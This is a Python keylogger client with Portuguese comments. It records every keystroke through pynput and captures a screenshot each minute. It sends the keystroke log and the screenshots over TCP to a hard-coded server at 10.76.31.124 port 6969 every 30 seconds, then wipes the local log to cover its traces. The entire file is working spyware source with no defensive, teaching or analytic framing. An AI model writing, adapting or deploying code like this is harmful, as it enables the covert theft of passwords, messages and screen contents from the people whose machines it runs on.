from pynput.keyboard import Listener
import re
import socket
import time
import platform
import tempfile
import os
import threading
import pyscreenshot as ImageGrab
import schedule

# Configurações do cliente
SERVER_IP = '10.76.31.124'  # Substitua pelo IP do servidor
SERVER_PORT = 6969         # Porta do servidor

# Define o caminho do arquivo de log e screenshot de acordo com o sistema operacional
if platform.system() == "Windows":
    arquivoLog = os.path.join(tempfile.gettempdir(), "key.log")
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
else:
    arquivoLog = os.path.join(tempfile.gettempdir(), "key.log")
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")

def capture(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', ' ', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    try:
        with open(arquivoLog, "a") as log:
            log.write(tecla)
    except Exception as e:
        print(f"Erro ao escrever no arquivo de log: {e}")

def send_file(file_path, file_type):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(file_type.encode('utf-8'))  # Envia o tipo de arquivo
            with open(file_path, 'rb') as file:
                while (chunk := file.read(1024)):
                    s.sendall(chunk)
        print(f'{file_type.capitalize()} enviado com sucesso.')
    except Exception as e:
        print(f"Erro ao enviar {file_type}: {e}")

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        send_file(screenshot_path, 'image')
        os.remove(screenshot_path)
    except Exception as e:
        print(f"Erro ao capturar e enviar screenshot: {e}")

def send_log():
    while True:
        time.sleep(30)  # Espera 30 segundos antes de enviar o log
        try:
            if os.path.exists(arquivoLog):
                with open(arquivoLog, "r") as log_file:
                    log_data = log_file.read()
                
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((SERVER_IP, SERVER_PORT))
                    s.sendall(b'l')  # Envia 'l' para indicar que é um log
                    s.sendall(log_data.encode('utf-8'))
                
                # Limpa o arquivo de log após o envio
                open(arquivoLog, 'w').close()

        except Exception as e:
            print(f"Erro ao enviar o log: {e}")

def schedule_tasks():
    # Agendamento para capturar screenshot a cada minuto
    schedule.every(1).minutes.do(take_screenshot)

    # Agendamento para enviar log do keylogger a cada 30 segundos
    schedule.every(30).seconds.do(lambda: send_file(arquivoLog, 'log'))

    while True:
        schedule.run_pending()
        time.sleep(1)

def start_listener():
    with Listener(on_press=capture) as l:
        l.join()

if __name__ == "__main__":
    # Inicia o thread para enviar o log
    log_thread = threading.Thread(target=send_log)
    log_thread.daemon = True
    log_thread.start()
    
    # Inicia o thread para agendar tarefas
    schedule_thread = threading.Thread(target=schedule_tasks)
    schedule_thread.daemon = True
    schedule_thread.start()
    
    # Inicia o listener de teclado
    start_listener()
